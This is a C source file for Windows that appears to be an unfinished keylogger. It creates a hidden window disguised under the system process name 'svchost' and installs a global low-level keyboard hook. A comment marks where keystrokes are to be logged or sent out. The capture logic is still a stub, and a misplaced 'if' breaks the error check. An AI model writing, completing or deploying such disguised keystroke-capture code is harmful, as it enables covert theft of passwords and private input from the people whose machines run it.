
#include "WinMain.h"

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInst, PSTR szCmdLine, int iCmdShow)

{
	HWND hwnd;
	MSG msg;
	WNDCLASSEX wndcls;
	const char g_szClassName[] = "svchost";

	wndcls.cbSize = sizeof(WNDCLASSEX);
	wndcls.style = CS_HREDRAW | CS_VREDRAW;
	wndcls.lpfnWndProc = WndProc;
	wndcls.cbClsExtra = 0;
	wndcls.cbWndExtra = 0;
	wndcls.hInstance = hInstance;
	wndcls.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wndcls.hCursor = LoadCursor(NULL, IDC_ARROW);
	wndcls.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wndcls.lpszClassName = g_szClassName;
	wndcls.lpszMenuName = NULL;
	wndcls.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

	if (!RegisterClassEx(&wndcls))
	{
		//log error
		return 1;
	}

	hwnd = CreateWindowEx(NULL,
		g_szClassName,
		"svchost",
		NULL,
		0, 0, 0, 0,
		NULL, NULL, hInstance, NULL);

	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
	if (hhkLowLevelKybd != NULL) //log error; return 2;

	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hhkLowLevelKybd);
	return msg.wParam;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;

	if (nCode == HC_ACTION)
	{
		switch (wParam)
		{
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
		case WM_KEYUP:

			switch (p->vkCode)
			{
			case VK_RSHIFT:
			case VK_SHIFT:
			case VK_LSHIFT:
				break;
			case VK_CAPITAL:
				break;
			case VK_NUMPAD0:
				break;
			case VK_NUMPAD1:
				break;
			case VK_NUMPAD2:
				break;
			case VK_NUMPAD3:
				break;
			case VK_NUMPAD4:
				break;
			case VK_NUMPAD5:
				break;
			case VK_NUMPAD6:
				break;
			case VK_NUMPAD7:
				break;
			case VK_NUMPAD8:
				break;
			case VK_NUMPAD9:
				break;
			case VK_ADD:
				//+
				break;
			case VK_BACK:
				//borra
				break;
			case VK_DECIMAL:
				// .
				break;
			case VK_DIVIDE:
				// /
				break;
			case VK_ESCAPE:
				break;
			case VK_TAB:
				break;
			case VK_MULTIPLY:
				// *
				break;
			case VK_OEM_1:
				//:; 
				break;
			case VK_OEM_102:
				//<> 
				break;
			case VK_OEM_2:
				// ?/ 
				break;
			case VK_OEM_3:
				//~`
				break;
			case VK_OEM_4:
				//{[ 
				break;
			case VK_OEM_5:
				// |\ 
				break;
			case VK_OEM_6:
				//}]
				break;
			case VK_OEM_7:
				// "'
				break;
			case VK_OEM_8:
				// §!
				break;
			case VK_OEM_COMMA:
				//<, 
				break;
			case VK_OEM_MINUS:
				// _- 
				break;
			case VK_OEM_PERIOD:
				// >. 
				break;
			case VK_OEM_PLUS:
				// += 
				break;
			case VK_SPACE:
				break;
			case VK_RETURN:
				break;
			case VK_DOWN:
				break;
			case VK_UP:
				break;
			case VK_LEFT:
				break;
			case VK_RIGHT:
				break;
			case VK_LCONTROL:
			case VK_RCONTROL:
				break;
			case VK_F1:
				break;
			case VK_F2:
				break;
			case VK_F3:
				break;
			case VK_F4:
				break;
			case VK_F5:
				break;
			case VK_F6:
				break;
			case VK_F7:
				break;
			case VK_F8:
				break;
			case VK_F9:
				break;
			case VK_F10:
				break;
			case VK_F11:
				break;
			case VK_F12:
				break;
			default:
				//logger / send p->vkCode
				//MessageBox(NULL, "AZaz09 key pressed", "Works", MB_ICONEXCLAMATION | MB_OK);
				break;
			}
			break;

		case WM_SYSKEYUP:
		default:
			break;
		}
	}
	return(CallNextHookEx(NULL, nCode, wParam, lParam));
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT iMsg, WPARAM wParam, LPARAM lParam)
{
	HDC hdc;
	PAINTSTRUCT ps;
	RECT rect;

	switch (iMsg)
	{
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	default:
		return DefWindowProc(hwnd, iMsg, wParam, lParam);
	}
}